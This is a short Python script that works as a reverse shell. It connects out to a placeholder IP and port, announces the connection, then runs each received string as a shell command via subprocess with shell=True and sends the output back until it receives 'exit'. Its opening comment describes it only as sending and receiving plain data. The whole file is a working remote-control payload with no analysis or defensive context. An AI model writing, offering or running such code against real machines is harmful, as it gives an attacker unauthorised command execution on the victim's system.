#!/usr/bin/python
# General - It is able to recieve and send plain data.


import socket
import subprocess

def execute_sys_cmd(comm):
    return subprocess.check_output(comm, shell=True)

conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn.connect(("<ip>", <port>))

conn.send(b'\n[+] Connection established.\n')

while True:
    comm = conn.recv(1024)
    if "exit" in comm.decode():
        break
    comm_result = execute_sys_cmd(comm.decode())
    conn.send(comm_result)

conn.close()